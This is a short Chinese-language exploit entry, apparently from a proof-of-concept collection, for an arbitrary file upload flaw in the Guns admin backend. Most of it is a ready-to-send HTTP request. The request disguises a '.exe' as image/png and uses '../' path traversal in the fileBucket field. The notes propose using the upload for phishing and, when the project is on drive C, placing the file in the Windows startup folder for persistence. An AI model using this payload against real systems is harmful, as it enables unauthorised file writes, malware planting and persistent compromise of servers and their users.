# Guns后台upload任意文件上传漏洞

- **系统**：Guns　|　**类型**：文件上传　|　**CVE**：—
- **请求**：`POST /api/sysFileInfo/upload HTTP/1.1`
- **关键头**：`Authorization: eyJhbGciOiJIUzUxMiJ9.eyJ1c2VySWQiOjEzMzk1NTA0Njc5Mzk2MzkyOTk…`　`Content-Type: multipart/form-data; boundary=---------------------------404…`　`Content-Length: 510`

**请求体 / payload**
```
-----------------------------4047569836919132683218702
Content-Disposition: form-data; name="file"; filename=".exe"
Content-Type: image/png
1111
-----------------------------4047569836919132683218702
Content-Disposition: form-data; name="secretFlag"
N
-----------------------------4047569836919132683218702
Content-Disposition: form-data; name="fileBucket"
../../../../../../../../../../../../../../../../../../看到请点击exe备份
-----------------------------4047569836919132683218702--
```
- **预期**：200　|　可以用在钓鱼，如果项目在c盘，可以放到启动项中， 这里可以看到是在哪个盘

**其他**
- 源码: 主项目：[https://gitee.com/stylefeng/guns](https://gitee.com/stylefeng/guns)
核心包：[https://gitee.com/stylefeng/roses](https://gitee.com/stylefeng/roses)